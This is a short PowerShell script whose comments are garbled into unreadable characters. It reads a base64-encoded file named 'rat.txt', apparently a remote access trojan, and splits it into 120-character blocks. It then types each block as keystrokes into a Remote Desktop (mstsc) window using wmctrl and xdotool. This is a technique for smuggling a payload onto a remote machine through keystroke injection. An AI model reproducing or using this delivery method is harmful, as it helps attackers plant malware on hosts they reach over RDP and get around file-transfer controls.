# ���� � ����� � base64
$file = "rat.txt"

# ������ ���������� �����
$base64Content = Get-Content -Path $file -Raw

# ���������� �������� � ����� (n)
$n = 120

# �������� ������ ������ �� base64Content
$blocks = [System.Collections.Generic.List[string]]::new()

for ($i = 0; $i -lt $base64Content.Length; $i += $n) {
    $block = $base64Content.Substring($i, [Math]::Min($n, $base64Content.Length - $i))
    $blocks.Add($block)
}

# �������� ������ ���� ��� �������� ������� .\wmctrl.exe -a mstsc | .\xdotool.exe key $arg
foreach ($block in $blocks) {
    .\wmctrl.exe -a mstsc | .\xdotool.exe key $block
    Start-Sleep -Seconds 0  # ������������� ����� � 1 ������� ����� ��������� ������
}
